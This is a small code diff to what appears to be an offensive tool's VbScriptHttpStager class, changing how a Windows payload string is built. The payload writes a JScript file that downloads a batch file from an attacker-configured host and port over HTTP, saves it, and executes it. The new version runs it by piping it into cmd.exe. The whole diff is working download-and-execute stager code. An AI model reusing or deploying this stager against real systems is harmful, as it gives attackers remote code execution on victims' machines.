@@ -158,7 +158,7 @@ class VbScriptHttpStager(HTTPStager):
         self.args = args
         self.host = conn_info[0]
         self.port = conn_info[1]
-        self.payload = """start /wait /b cmd.exe /c "echo var H = new ActiveXObject("WinHttp.WinHttpRequest.5.1");H.Open("GET", "http://{0}:{1}/{2}", /*async=*/false);H.Send();B = new ActiveXObject("ADODB.Stream");B.Type = 1;B.Open();B.Write(H.ResponseBody);B.SaveToFile("{2}.bat");S = new ActiveXObject("Wscript.Shell");S.run("{2}.bat");" > {2}.js && start /b cmd.exe /c "cscript {2}.js" """.format(self.host, self.port, filename)
+        self.payload = """start /wait /b cmd.exe /c echo var H = new ActiveXObject("WinHttp.WinHttpRequest.5.1");H.Open("GET", "http://{0}:{1}/{2}", /*async=*/false);H.Send();B = new ActiveXObject("ADODB.Stream");B.Type = 1;B.Open();B.Write(H.ResponseBody);B.SaveToFile("{2}.bat"); > {2}.js && cscript {2}.js && cmd.exe /k < {2}.bat""".format(self.host, self.port, filename)
 
 
 def choose_stager(stagers):
